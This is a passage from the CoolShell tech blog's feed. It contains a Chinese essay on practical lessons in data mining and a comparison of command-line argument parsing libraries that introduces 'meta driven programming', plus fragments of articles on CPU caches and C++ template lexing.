<span class="ez-toc-section" id="%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"></span>参考资料<span class="ez-toc-section-end"></span>
</h4>
<p>wiki上的CPU cache解析（<a href="https://zh.wikipedia.org/zh-cn/CPU%E7%BC%93%E5%AD%98" target="_blank">中文版</a>）（<a href="https://en.wikipedia.org/wiki/CPU_cache" target="_blank">英文版</a>）。</p>
<p>上海交通大学师生制作的一个关于<a href="http://yoursunny.com/study/EI209/?topic=cache" target="_blank">cache映射功能、命中率计算</a>的教学演示程序，模拟了不同关联模式下cache的映射和命中几率，形象直观。</p>
<p>网易数据库大牛<a href="https://weibo.com/u/2216172320" target="_blank">@何_登成</a>自制PPT<a href="http://vdisk.weibo.com/s/dBzv2sibdUB8" target="_blank">《CPU Cache and Memory Ordering》</a>，信息量超大！</p>
<p>南京大学计算机教学<a href="http://cs.nju.edu.cn/swang/CompArchOrg_12F/slides/lecture09.pdf" target="_blank">公开PPT</a>，温馨提示，地址域名里面改变字段”lecture”后面的数字编号可切换课程;-)</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-07-30T09:05:38+08:00</pubDate>
<guid>https://coolshell.cn/articles/10249.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 数据的游戏：冰与火 ]]></title>
<link>https://coolshell.cn/articles/10192.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >我对数据挖掘和机器学习是新手，从去年7月份在Amazon才开始接触，而且还是因为工作需要被动接触的，以前都没有接触过，做的是需求预测机器学习相关的。后来，到了淘宝后，自己凭兴趣主动地做了几个月的和用户地址相关数据挖掘上的工作，有一些浅薄的心得。下面这篇文章主要是我做为一个新人仅从事数据方面技术不到10个月的一些心得，也许对你有用，也许很傻，不管怎么样，欢迎指教和讨论。</p>
<p>另外，注明一下，这篇文章的标题模仿了一个美剧《<a href="https://movie.douban.com/subject/3016187/" target="_blank">权力的游戏：冰与火之歌</a>》。在数据的世界里，我们看到了很多很牛，很强大也很有趣的案例。但是，<strong>数据就像一个王座一样，像征着一种权力和征服，但登上去的路途一样令人胆颤</strong>。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E4%B8%AD%E7%9A%84%E4%B8%89%E7%A7%8D%E8%A7%92%E8%89%B2" title="数据挖掘中的三种角色">数据挖掘中的三种角色</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-2" href="#%E6%95%B0%E6%8D%AE%E7%9A%84%E8%B4%A8%E9%87%8F" title="数据的质量">数据的质量</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%A1%88%E4%BE%8B%E4%B8%80%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E6%A0%87%E5%87%86" title="案例一：数据的标准">案例一：数据的标准</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%A1%88%E4%BE%8B%E4%BA%8C%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E5%87%86%E7%A1%AE" title="案例二：数据的准确">案例二：数据的准确</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%95%B0%E6%8D%AE%E7%9A%84%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF" title="数据的业务场景">数据的业务场景</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%95%B0%E6%8D%AE%E7%9A%84%E5%88%86%E6%9E%90%E7%BB%93%E6%9E%9C" title="数据的分析结果">数据的分析结果</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E4%B8%AD%E7%9A%84%E4%B8%89%E7%A7%8D%E8%A7%92%E8%89%B2"></span>数据挖掘中的三种角色<span class="ez-toc-section-end"></span>
</h4>
<p>在Amazon里从事机器学习的工作时，我注意到了Amazon玩数据的三种角色。</p>
<ul>
<li>
<strong>Data Analyzer：数据分析员</strong>。这类人的人主要是分析数据的，从数据中找到一些规则，并且为了数据模型的找不同场景的Training Data。另外，这些人也是把一些脏数据洗干净的的人。</li>
</ul>
<ul>
<li>
<strong>Research Scientist：研究科学家</strong>。这种角色主要是根据不同的需求来建立数据模型的。他们把自己戏称为不近人间烟火的奇异性物种，就像《生活大爆炸》里的 那个Sheldon一样。这些人基本上玩的是数据上的科学</li>
</ul>
<ul>
<li>
<strong>Software Developer ：软件开发工程师</strong>。主要是把 Scientist 建立的数据模型给实现出来，交给Data Analyzer去玩。这些人通常更懂的各种机器学习的算法。</li>
</ul>
<p>我相信其它公司的做数据挖掘或是机器学习的也就这三种工作，或者说这三种人，对于我来说，</p>
<p><span id="more-10192"></span></p>
<ul>
<li>
<strong>最有技术含量的是 Scientist</strong>，因为数据建模和抽取最有意义的向量，以及选取不同的方法都是这类人来决定的。这类人，我觉得在国内是找不到的。</li>
</ul>
<ul>
<li>
<strong>最苦逼，也最累，但也最重要的是Data Analyzer</strong>，他们的活也是这三个角色中最最最重要的（注意：我用了三个最）。因为，无论你的模型你的算法再怎么牛，在一堆烂数据上也只能干出一堆垃圾的活来。正所谓：Garbage In, Garbage Out ！但是这个活是最脏最累的活，也是让人最容易退缩的活。</li>
</ul>
<ul>
<li>
<strong>最没技术含量的是Software Developer</strong>。现在国内很多玩数据的都以为算法最重要，并且，很多技术人员都在研究机器学习的算法。错了，最重要的是上面两个人，一个是苦逼地洗数据的Data Analyzer，另一个是真正懂得数据建模的Scientist！而像什么<a title="K-Means 算法" href="https://coolshell.cn/articles/7779.html" target="_blank">K-Means</a>，<a title="K Nearest Neighbor 算法" href="https://coolshell.cn/articles/8052.html" target="_blank">K Nearest Neighbor</a>，或是别的什么贝叶斯、回归、决策树、随机森林等这些玩法，都很成熟了，而且又不是人工智能，说白了，这些算法在机器学习和数据挖掘中，似乎就像Quick Sort之类的算法在软件设计中基本没什么技术含量。当然，我不是说算法不重要，我只想说这些算法在整个数据处理中是最不重要的。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%95%B0%E6%8D%AE%E7%9A%84%E8%B4%A8%E9%87%8F"></span>数据的质量<span class="ez-toc-section-end"></span>
</h4>
<p><strong>目前所流行的Buzz Word——大数据是相当误导人的。在我眼中，<span style="color: #ff0000;">数据不分大小，只分好坏</span>。</strong></p>
<p>在处理数据的过程中，我第一个感受最大的就是数据质量。下面我分几个案例来说明：</p>
<h5>
<span class="ez-toc-section" id="%E6%A1%88%E4%BE%8B%E4%B8%80%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E6%A0%87%E5%87%86"></span>案例一：数据的标准<span class="ez-toc-section-end"></span>
</h5>
<p>在Amazon里，所有的商品都有一个唯一的ID，叫ASIN——Amazon Single Identify Number，这个ID是用来标识商品的唯一性的（来自于条形码）。也就是说，无论是你把商品描述成什么样，只要ASIN一样，这就是完完全全一模一样的商品。</p>
<p>这样，就不像淘宝一样，当你搜索一个iPhone，你会出现一堆各种各样的iPhone，有的叫“超值iPhone”，有的叫“苹果iPhone”，有的叫“智能手机iPhone”，有的叫“iPhone 白色/黑色”……，这些同一个商品不同的描述是商家为了吸引用户。但是带来的问题有两点：</p>
<p style="padding-left: 30px;">1）<strong>用户体验不好</strong>。以商品为中心的业务模型，对于消费者来说，体验明显好于以商家为中心的业务模型。</p>
<p style="padding-left: 30px;">2）<strong>只要你不能正确读懂（识别）数据，你后面的什么算法，什么模型统统没用</strong>。</p>
<p>所以，只要你玩数据，你就会发现，<strong>如果数据的标准没有建立起来，干什么都没用。数据标准是数据质量的第一道关卡</strong>，没这个玩意，你就什么也别玩了。所谓数据的标准，为数据做唯一标识只是其中最最基础的一步，数据的标准还单单只是这个，<strong>更重要的是把数据的标准抽象成数学向量，没有数学向量，后面也无法挖掘</strong>。</p>
<p>所以，你会看到，<strong>洗数据的大量的工作就是在把杂乱无章的数据归并聚合，这就是在建立数据标准。这里面绝对少不了人肉的工作</strong>。无非就是：</p>
<ul>
<li><span style="line-height: 13px;">聪明的人在数据产生之前就定义好标准，并在数据产生之时就在干数据清洗的工作。</span></li>
</ul>
<ul>
<li>一般的人是在数据产生并大量堆积之后，才来干这个事。</li>
</ul>
<p>另外，说一下Amazon的ASIN，这个事从十多年前就开始了，我在Amazon的内网里看到的资料并没有说为什么搞了个这样一个ID，我倒觉得这并不是因为Amazon因为玩数据发现必需建议个商品ID，也许因为Amazon的业务模型就是设计成以“商品为中心”的。今天，这个ASIN依然有很多很多的问题，ASIN一样不能完全保证商品就是一样的，ASIN不一样也不代表商品不一样，不过90%以上的商品是保证的。Amazon有专门的团队Category Team，里面有很多业务人员天天都在拼命地在对ASIN的数据进行更正。</p>
<h5>
<span class="ez-toc-section" id="%E6%A1%88%E4%BE%8B%E4%BA%8C%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E5%87%86%E7%A1%AE"></span>案例二：数据的准确<span class="ez-toc-section-end"></span>
</h5>
<p>用户地址是我从事过数据分析的另一个事情。我还记得当时看到那数以亿计的用户地址的数据的那种兴奋。但是随后我就兴奋不起来了。因为地址是用户自己填写的，这里面有很多的坑，都不是很容易做的。</p>
<p>第一个是假/错地址，因为有的商家作弊或是用户做测试。所以地址是错的，</p>
<ul>
<li>比如，直接就输入“该地址不存在”，“13243234asdfasdi”之类的。这类的地址是可以被我的程序识别出来的。</li>
</ul>
<ul>
<li>还有很难被我的程序所识别出来的。比如：“宇宙路地球小区”之类的。但这类地址可以被人识别出来。</li>
</ul>
<ul>
<li>还有连人都识别不出来的，比如：“北京市东四环中路23号南航大厦5楼540室”，这个地址根本不存在。</li>
</ul>
<p>第二个是真地址，但是因为用户写的不标准，所以很难处理，比如：</p>
<ul>
<li><span style="line-height: 13px;">缩写：“建国门外大街” 和 “建外大街”，“中国工商银行”和“工行”……</span></li>
</ul>
<ul>
<li>错别字：“潮阳门”，“通慧河”……</li>
</ul>
<ul>
<li>颠倒：“东四环中路朝阳公园” 和 “朝阳公园 （靠东四环）” ……</li>
</ul>
<ul>
<li>别名：有的人写的是开发商的小区名“东恒国际”，有的则是写行政的地名“八里庄东里”……</li>
</ul>
<p>这样的例子多得不能再多了。可见数据如果不准确，会增加你处理的难度。有个比喻非常好，<strong>玩数据的就像是在挖金矿一样，如果含金量高，那么，挖掘的难度就小，也就容易出效果，如果含金量低，那么挖掘的难度就大，效果就差</strong>。</p>
<p>上面，我给了两个案例，旨在说明——</p>
<p style="padding-left: 30px;"><strong>1）数据没有大小之分，只有含金量大的数据和垃圾量大的数据之分</strong>。</p>
<p style="padding-left: 30px;"><strong>2）数据清洗是一件多么重要的工作，这也是一件人肉工作量很大的工作。</strong></p>
<p><strong></strong>所以，这个工作最好是在数据产生的时候就一点一滴的完成。</p>
<p>有一个观点：<strong>如果数据准确度在60%的时候，你干出来的事，一定会被用户骂！如果数据准确度在80%左右，那么用户会说，还不错！只有数据准确度到了90%的时候，用户才会觉得真牛B。但是从数据准确度从80%到90%要付出的成本要比60% 到 80%的付出大得多得多</strong>。大多数据的数据挖掘团队都会止步于70%这个地方。因为，再往后，这就是一件相当累的活。</p>
<h4>
<span class="ez-toc-section" id="%E6%95%B0%E6%8D%AE%E7%9A%84%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF"></span>数据的业务场景<span class="ez-toc-section-end"></span>
</h4>
<p>我不知道有多少数据挖掘团队真正意识到了业务场景和数据挖掘的重要关系？<strong>我们需要知道，根本不可能做出能够满足所有业务的数据挖掘和分析模型</strong>。</p>
<p>推荐音乐视频，和电子商务中的推荐商品的场景完全不一样。电商中，只要你买了一个东西没有退货，那么，有很大的概率我可以相信你是喜欢这个东西的，然后，对于音乐和视频，你完全不能通过用户听了这首歌或是看了这个视频就武断地觉得用户是喜欢这首歌和这个视频的，所以，我们可以看到，推荐算法在不同的业务场景下的实现难度也完全不一样。</p>
<p>说到推荐算法，你是不是和我一样，有时候会对推荐有一种感觉——<strong>推荐就是一种按不同维度的排序的算法</strong>。我个人以为，就提一下推荐这个东西在某些业务场景下是比较Tricky的，比如，推荐有两种（不是按用户关系和按物品关系这两种），</p>
<ul>
<li>一种是共性化推荐，结果就是推荐了流行的东西，这也许是好 的，但这也许会是用户已知的东西，比如，到了北京，我想找个饭馆，你总是给我推荐烤鸭，我想去个地方，你总是给我推荐天安门故宫天坛（因为大多数人来北京就是吃烤鸭，就是去天安门的），这些我不都知道了嘛，还要你来推荐？另外，共性化的东西通常是可以被水军刷的。</li>
</ul>
<ul>
<li>另一种是一种是个性化推荐，这个需要分析用户的个体喜好，好的就是总是给我我喜欢的，不好的就是也许我的口味会随我的年龄和环境所改变，而且，总是推荐符合用户口味的，不能帮用户发掘新鲜点。比如，我喜欢吃辣的，你总是给我推荐川菜和湘菜，时间长了我也会觉得烦的。</li>
</ul>
<p><strong>推荐有时并不是民主投票，而是专业用户或资深玩家的建议；推荐有时并不是推荐流行的，而是推荐新鲜而我不知道的</strong>。你可以看到，不同的业务场景，不同的产品形态下的玩法可能完全不一样，</p>
<p>另外，就算是对于同一个电子商务来说，书、手机 和服装的业务形态完全不一样。我之前在Amazon做Demand Forecasting（用户需求预测）——通过历史数据来预测用户未来的需求。</p>
<ul>
<li>对于书、手机、家电这些东西，在Amazon里叫Hard Line的产品，你可以认为是“标品”（但也不一定），预测是比较准的，甚至可以预测到相关的产品属性的需求。</li>
</ul>
<ul>
<li>但是地于服装这样的叫Soft Line的产品，Amazon干了十多年都没有办法预测得很好，因为这类东西受到的干扰因素太多了，比如：用户的对颜色款式的喜好，穿上去合不合身，爱人朋友喜不喜欢…… 这类的东西太容易变了，买得人多了反而会卖不好，所以根本没法预测好，更别Stock/Vender Manager 提出来的“预测某品牌的某种颜色的衣服或鞋子”。</li>
</ul>
<p>对于需求的预测，我发现，长期在这个行业中打拼的人的预测是最准的，什么机器学习都是浮云。机器学习只有在你要面对的是成千上万种不同商品和品类的时候才会有意义。</p>
<p><strong>数据挖掘不是人工智能，而且差得还太远。不要觉得数据挖掘什么事都能干，找到一个合适的业务场景和产品形态，比什么都重要</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E6%95%B0%E6%8D%AE%E7%9A%84%E5%88%86%E6%9E%90%E7%BB%93%E6%9E%9C"></span>数据的分析结果<span class="ez-toc-section-end"></span>
</h4>
<p>我看到很多的玩大数据的，基本上干的是数据统计的事，从多个不同的维度来统计数据的表现。最简单最常见的统计就是像网站统计这样的事。比如：PV是多少，UV是多少，来路是哪里，浏览器、操作系统、地理、搜索引擎的分布，等等，等等。</p>
<p>唠叨一句，千万不要以为，你一天有十几个T的日志就是数据了，也不要以为你会用Hadoop/MapReduce分析一下日志，这就是数据挖掘了，说得难听一点，你在做的只不过是一个统计的工作。那几个T的Raw Data，基本上来说没什么意义，只能叫日志，连数据都算不上，只有你统计出来的这些数据才是有点意义的，才能叫数据。</p>
<p>当一个用户在面对着自己网店的数据的时候，比如：每千人有5个人下单，有65%的访客是男的，18-24岁的人群有30%，等等。甚至你给出了，你打败了40%同类型商家的这样的数据。作为一个商户，面对这些数据时，大多数人的表现是完全不知道自己能干什么？是把网站改得更男性一点，还是让年轻人更喜欢一点？完全不知道所措。</p>
<p>只要你去看一看，你会发现，好些好些的数据分析出来的结果，看上去似乎不错，但是其实完全不知道下一步该干什么？</p>
<p>所以，我觉得，<strong>数据分析的结果并不仅仅只是把数据呈现出来，而更应该关注的是通过这些数据后面可以干什么？如果看了数据分析的结果后并不知道可以干什么，那么这个数据分析是失败的。</strong></p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<p>综上所述，下面是我觉得数据挖掘或机器学习最重要的东西：</p>
<p style="padding-left: 30px;">1）<strong>数据的质量</strong>。分为数据的标准和数据的准确。数据中的杂音要尽量地排除掉。为了数据的质量，大量人肉的工作少不了。</p>
<p style="padding-left: 30px;">2）<strong>数据的业务场景</strong>。我们不可能做所有场景下的来，所以，业务场景和产品形态很重要，我个人感觉业务场景越窄越好。</p>
<p style="padding-left: 30px;">3）<strong>数据的分析结果</strong>，要让人能看得懂，知道接下来要干什么，而不是为了数据而数据。</p>
<p>搞数据挖掘的人很多，但成功的案例却不多（相比起大量的尝试来说），就目前而言，<strong>我似乎觉得目前的数据挖掘的技术是一种过渡技术，还在摸索阶段。另外，好些数据挖掘的团队搞得业务不业务，技术不技术的，为其中的技术人员感到惋惜</strong>……</p>
<p>不好意思，我只给出了问题，没有建议，这也说明数据分析中有很多的机会……</p>
<p><span style="color: #770000; font-size: 12pt;">最后，还要提的一个是“<span style="color: #cc0000;"><strong>数据中的个人隐私问题</strong></span>”，这似乎就像那些有悖伦理的黑魔法一样，你要成功就得把自己变得黑暗。是的，<strong>数据就像一个王座一样，像征着一种权力和征服，但登上去的路途一样令人胆颤</strong>。</span></p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-07-31T08:11:17+08:00</pubDate>
<guid>https://coolshell.cn/articles/10192.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 数据即代码：元驱动编程 ]]></title>
<link>https://coolshell.cn/articles/10337.html</link>
<content><![CDATA[ 
<p><strong>（感谢 <a href="https://weibo.com/weidagang" target="_blank">@文艺复兴记</a>（todd） 投递此文）</strong></p>
<p>几个小伙伴在考虑下面这个各个语言都会遇到的问题：</p>
<p><strong>问题：设计一个命令行参数解析API</strong></p>
<p>一个好的命令行参数解析库一般涉及到这几个常见的方面：</p>
<p>1) 支持方便地生成帮助信息</p>
<p>2) 支持子命令，比如：git包含了push, pull, commit等多种子命令</p>
<p>3) 支持单字符选项、多字符选项、标志选项、参数选项等多种选项和位置参数</p>
<p>4) 支持选项默认值，比如：–port选项若未指定认为5037</p>
<p>5) 支持使用模式，比如：tar命令的-c和-x是互斥选项，属于不同的使用模式</p>
<p>经过一番考察，小伙伴们发现了这个几个有代表性的API设计：</p>
<p><strong>1. getopt()：</strong></p>
<p><a href="https://www.gnu.org/software/libc/manual/html_node/Getopt.html">getopt()</a>是libc的标准函数，很多语言中都能找到它的移植版本。</p>
<p><span id="more-10337"></span></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">//C
while ((c = getopt(argc, argv, "ac:d:")) != -1) {
    int this_option_optind = optind ? optind : 1;
    switch (c) {
    case 'a':
        printf ("option a");
        aopt = 1;
        break;
    case 'c':
        printf ("option c with value '%s'", optarg);
        copt = optarg;
        break;
    case 'd':
        printf ("option d with value '%s'", optarg);
        dopt = optarg;
        break;
    case '?':
        break;
    default:
        printf ("?? getopt returned character code 0%o ??", c);
    }
}
</pre>
<p>getopt()的核心是一个类似printf的格式字符串的命令行参数描述串，如上面的”ac:d:”定义了”a”, “c”，”d”3个命令行参数，其中，a是一个标志符不需要参数，”c”和”d”需要跟参数。getopt()功能非常弱，只支持单个字符的标志选项和参数选项。如果按上面的5点来比对，基本上只能说是勉强支持第3点，其他几项只能靠程序自己来实现了，所以，想直接基于getopt()实现一个像git这样复杂的命令行参数是不可能的，只有自己来做很多的解析工作。小伙伴们看过getopt()之后一致的评价是:图样图森破。</p>
<p><strong>2. Google gflags</strong></p>
<p>接着，小伙伴们又发现了<a href="https://code.google.com/p/gflags/">gflags</a>这个Google出品C++命令行参数解析库。</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">//C++
DEFINE_bool(memory_pool, false, "If use memory pool");
DEFINE_bool(daemon, true, "If started as daemon");
DEFINE_string(module_id, "", "Server module id");
DEFINE_int32(http_port, 80, "HTTP listen port");
DEFINE_int32(https_port, 443, "HTTPS listen port");

int main(int argc, char** argv) {
    ::google::ParseCommandLineFlags(&amp;argc, &amp;argv, true);

    printf("Server module id: %s", FLAGS_module_id.c_str());

    if (FLAGS_daemon) {
      printf("Run as daemon: %d", FLAGS_daemon);
    }
    if (FLAGS_memory_pool) {
      printf("Use memory pool: %d", FLAGS_daemon);
    }

    Server server;

    return 0;
}
</pre>
<p>小伙伴们看了后不由得感叹“真心好用啊”！的确，gflags简单地通过几个宏就定义了命令行选项，基本上很好的支持了上面提到的1，3，4这几项，比起getopt()来强多了。对于类似cp这样的小命令，gflags应该是够用了，但要达到git这种级别就显得有些单薄了。</p>
<p><strong>3. Ruby Commander</strong></p>
<p>接下来小伙伴们又发现了Ruby Commander库：</p>
<p></p>
<pre data-enlighter-language="ruby" class="EnlighterJSRAW">//Ruby
# :name is optional, otherwise uses the basename of this executable
program :name, 'Foo Bar'
program :version, '1.0.0'
program :description, 'Stupid command that prints foo or bar.'
command :bar do |c|
  c.syntax = 'foobar bar [options]'
  c.description = 'Display bar with optional prefix and suffix'
  c.option '--prefix STRING', String, 'Adds a prefix to bar'
  c.option '--suffix STRING', String, 'Adds a suffix to bar'
  c.action do |args, options|
    options.default :prefix =&gt; '(', :suffix =&gt; ')'
    say "#{options.prefix}bar#{options.suffix}"
  end
end
$ foobar bar
# =&gt; (bar)
$ foobar bar --suffix '}' --prefix '{'
# =&gt; {bar}
</pre>
<p>Commander库利用Ruby酷炫的语法定义了一种描述命令行参数的内部DSL，看起来相当高端大气上档次。除了上面的第5项之外，其他几项都有很好的支持，可以说Commander库的设计基本达到了git这种级别命令行参数解析的要求。只是，要搞懂Ruby这么炫的语法和这个库的使用方法恐怕就不如getopt()和gflags容易了。有小伙伴当场表示想要学习Ruby，但是也有小伙伴表示再看看其他库再说。</p>
<p><strong>4. Lisp cmdline库</strong></p>
<p>接下来，小伙伴们发现了Lisp方言Racket的<a href="https://docs.racket-lang.org/reference/Command-Line_Parsing.html">cmdline库</a>。</p>
<p></p>
<pre data-enlighter-language="ruby" class="EnlighterJSRAW">//Lisp
(parse-command-line "compile" (current-command-line-arguments)
  `((once-each
     [("-v" "--verbose")
      ,(lambda (flag) (verbose-mode #t))
      ("Compile with verbose messages")]
     [("-p" "--profile")
      ,(lambda (flag) (profiling-on #t))
      ("Compile with profiling")])
    (once-any
     [("-o" "--optimize-1")
      ,(lambda (flag) (optimize-level 1))
      ("Compile with optimization level 1")]
     [("--optimize-2")
      ,(lambda (flag) (optimize-level 2))
      (("Compile with optimization level 2,"
        "which implies all optimizations of level 1"))])
    (multi
     [("-l" "--link-flags")
      ,(lambda (flag lf) (link-flags (cons lf (link-flags))))
      ("Add a flag &lt;lf&gt; for the linker" "lf")]))
   (lambda (flag-accum file) file)
   '("filename"))
</pre>
<p>这是神马浮云啊?括号套括号，看起来很厉害的样子，但又不是很明白。看到这样的设计，有的小伙伴连评价都懒得评价了，但也有的小伙伴对Lisp越发崇拜，表示Lisp就是所谓的终极语言了，没有哪门语言能写出这么不明觉历的代码来！小伙伴们正准备打完收工，突然…</p>
<p><strong>5. Node.js的LineParser库</strong></p>
<p>发现了Node.js的<a href="https://github.com/weidagang/line-parser-js">LineParser库</a>:</p>
<p>[javascript]<br>
//JavaScript<br>
var meta = {<br>
program : ‘adb’,<br>
name : ‘Android Debug Bridge’,<br>
version : ‘1.0.3’,<br>
subcommands : [ ‘connect’, ‘disconnect’, ‘install’ ],<br>
options : {<br>
flags : [<br>
[ ‘h’, ‘help’, ‘print program usage’ ],<br>
[ ‘r’, ‘reinstall’, ‘reinstall package’ ],<br>
[ ‘l’, ‘localhost’, ‘localhost’ ]<br>
],<br>
parameters : [<br>
[ null, ‘host’, ‘adb server hostname or IP address’, null ],<br>
[ ‘p’, ‘port’, ‘adb server port’, 5037 ]<br>
]<br>
},<br>
usages : [<br>
[ ‘connect’, [‘host’, ‘[port]’], null, ‘connect to adb server’, adb_connect ],<br>
[ ‘connect’, [ ‘l’ ], null, ‘connect to the local adb server’, adb_connect ],<br>
[ ‘disconnect’, null, null, ‘disconnect from adb server’, adb_disconnect ],<br>
[ ‘install’, [‘r’], [‘package’], ‘install package’, adb_install ],<br>
[ null, [‘h’], null, ‘help’, adb_help ],<br>
]<br>
};</p>
<p>try {<br>
var lineparser = require(‘lineparser’);<br>
var parser = lineparser.init(meta);<br>
// adb_install will be invoked<br>
parser.parse([‘install’, ‘-r’, ‘/pkgs/bird.apk’]);<br>
}<br>
catch (e) {<br>
console.error(e);<br>
}<br>
[/javascript]</p>
<p>天啊！？这是什么？我和小伙伴们彻底惊呆了！短短十几行代码就获得了上面5点的全面支持，重要的是小伙伴们居然一下子就看懂了，没有任何的遮遮掩掩和故弄玄虚。本来以为Ruby和Lisp很酷，小伙伴们都想马上去学Ruby和Lisp了，看到这个代码之后怎么感觉前面全是在装呢？有个小伙伴居然激动得哭着表示：我写代码多年，以为再也没有什么代码可以让我感动，没想到这段代码如此精妙，我不由得要赞叹了，实在是太漂亮了！</p>
<p>小伙伴们的故事讲完了，您看懂了吗？如果没有看懂的话，正题开始了：</p>
<p>在绝大多数语言中数据和代码可以说是泾渭分明，习惯C++、Java等主流语言的程序员很少去思考数据和代码之间的关系。与多数语言不同的是Lisp以“数据即代码，代码即数据”著称，Lisp用S表达式统一了数据和代码的形式而独树一帜。Lisp奇怪的S表达式和复杂的宏系统让许多人都感到Lisp很神秘，而多数Lisp教程要么强调函数式编程，要么鼓吹宏如何强大，反而掩盖了Lisp真正本质的东西，为此我曾写过一篇<a href="https://www.cnblogs.com/weidagang2046/archive/2012/06/03/tao_of_lisp.html">《Lisp的永恒之道》</a>介绍Lisp思想。</p>
<p>设计思想和具体技术的区别在于前者往往可以在不同的环境中以不同的形式展现出来。比如，熟悉函数式编程的程序员在理解了纯函数的优点后即使是用C语言也会更倾向于写出无副作用的函数来，这就是函数式思想在命令式环境的应用。所以，理解Lisp思想一定要能在非Lisp环境应用，才算是融汇贯通。</p>
<p>如果真正理解了Lisp的本质，那所谓的“数据即代码，代码即数据”一点儿也不神秘，这不就是我们每天打交道的配置文件吗！？如果你还不是很理解的话，我们通过下面几个问题慢慢分析：</p>
<p>1) 配置的本质是什么？为什么要在程序中使用配置文件？</p>
<p>不知道你是否意识到了，我们每天都在使用的各种各样的<strong>配置本质上是一种元数据也是一种DSL</strong>，这和Lisp基于S表达式的“数据即代码，代码即数据”没有本质区别。在C++、Java等程序中引入配置文件的目的正是用DSL弥补通用语言表达能力和灵活性的不足。我知道不少人喜欢从计算的角度来看到程序和语言，似乎只有图灵完备的语言如C++、Java、Python等才叫程序设计语言，而类似CSS和HTML这样的东西根本不能叫做程序设计语言。其实，在我看来这种观点过于狭隘，<strong>程序的本质是语义的表达</strong>，而语义表达不一定要是计算。</p>
<p>2) 配置是数据还是代码？</p>
<p>很明显，Both!说配置是数据，因为它是声明式的描述，能方便地修改和传输；说配置是代码，因为它在表达逻辑，你的程序实际上就是配置的解释器。</p>
<p>3) 配置的格式是什么？</p>
<p>配置的格式是任意的，可以自己定义语法，只要配以相应的解释器就行。不过更简单通用的做法是基于XML、JSON、或S表达式等标准结构，在此之上进一步定义schema。甚至完全不必是文件，在我们的项目中配置经常是放到用关系数据库中的。另外，下面我们还会看到用语言的Literal数据作为配置。</p>
<p>4) 业务逻辑都可以放到配置中吗？</p>
<p>这个问题的答案显然是：Yes！我没有遇到过不可以放入配置的逻辑，只是问题在于这样做是否值得，能达到什么效果。对于需要灵活变化，重复出现，有复用价值的东西放入作为配置是明智的选择。这篇文章的主要目的就在于介绍把<strong>主要业务逻辑都放到配置中，再通过程序解释执行配置的设计方法，我称之为：元驱动编程(Meta Driven Programming)</strong>。</p>
<p></p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-08-09T10:18:31+08:00</pubDate>
<guid>https://coolshell.cn/articles/10337.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C++模板”>>”编译问题与词法消歧设计 ]]></title>
<link>https://coolshell.cn/articles/10449.html</link>
<content><![CDATA[ 
<p><strong>（感谢 <a href="https://weibo.com/weidagang" target="_blank">@文艺复兴记</a>（todd） 投递此文）</strong></p>
<p>在编译理论中，通常将编译过程抽象为5个主要阶段：词法分析(Lexical Analysis)，语法分析(Parsing)，语义分析(Semantic Analysis)，优化(Optimization)，代码生成(Code Generation)。这5个阶段类似Unix管道模型，上一个阶段的输出作为下一个阶段的输入。其中，词法分析是根据输入源代码文本流，分割出词，识别类别，产生词法元素(Token)流，如：</p>
<p></p>
<pre data-enlighter-language="cpp" class="EnlighterJSRAW">int a = 10;
</pre>
